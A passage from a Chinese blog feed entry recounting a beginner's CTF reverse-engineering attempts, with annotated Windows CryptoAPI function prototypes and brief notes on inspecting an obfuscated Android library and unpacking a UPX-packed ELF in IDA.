dwFlags,               <span class="comment">//可选标识</span></span></span><br><span class="line"><span class="params">  [in]      PCRYPT_DECODE_PARA pDecodePara,           <span class="comment">//指向包含解码段落信息的CRYPT_DECODE_PARA结构的指针。</span></span></span><br><span class="line"><span class="params">  [out]     <span class="type">void</span>               *pvStructInfo,         <span class="comment">//接收解码后数据的缓冲区指针</span></span></span><br><span class="line"><span class="params">  [in,out] DWORD              *pcbStructInfo          <span class="comment">//pvStructInfo缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转换成指定标识的字节数组</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptStringToBinary</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]     LPCTSTR pszString,    <span class="comment">//要转换字符串的指针</span></span></span><br><span class="line"><span class="params">  [in]     DWORD cchString,      <span class="comment">//要转换字符串的长度，不包括终止NULL字符。如果此参数为零，则pszString是以null结尾的字符串。</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwFlags,        <span class="comment">//转换标识（ASCII、十六进制、Base64等）</span></span></span><br><span class="line"><span class="params">  [in]     BYTE *pbBinary,       <span class="comment">//接收转换后数据的缓冲区指针（如果为NULL则自动计算pcbBinary长度）</span></span></span><br><span class="line"><span class="params">  [in,out] DWORD *pcbBinary,     <span class="comment">//pbBinary参数长度（以字节为单位，如果为0则忽略pbBinary参数）</span></span></span><br><span class="line"><span class="params">  [out]    DWORD *pdwSkip,       <span class="comment">//可选参数</span></span></span><br><span class="line"><span class="params">  [out]    DWORD *pdwFlags       <span class="comment">//可选参数</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN">ALG_ID 标识符与值的映射表</a></p><p>经过综上分析，可以总结：</p><img src="/posts/5850d757/1.2.1.png" class="" title="IDA分析"><h1 id="2-FakePica"><a href="#2-FakePica" class="headerlink" title="2. FakePica"></a>2. FakePica</h1><p>运行一下啥都没发生。</p><img src="/posts/5850d757/2.1.png" class="" title="运行程序"><p>载入AK，发现找不到入口文件。但看到它有so文件。</p><img src="/posts/5850d757/2.2.png" class="" title="AK"><img src="/posts/5850d757/2.3.png" class="" title="AK"><p>解包将so文件载入IDA查看导出表，发现好乱…应该是混淆了。</p><img src="/posts/5850d757/2.4.png" class="" title="IDA"><img src="/posts/5850d757/2.5.png" class="" title="IDA"><h1 id="3-奇怪的交易"><a href="#3-奇怪的交易" class="headerlink" title="3. 奇怪的交易"></a>3. 奇怪的交易</h1><p>一个有UPX壳的64位ELF文件，直接拿去kali脱壳。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d trade</span><br></pre></td></tr></table></figure><p>脱壳后载入IDA没有找到关键字符串。</p><p>无从下手啊，等大佬们的wp。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;小菜鸡打CTF。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
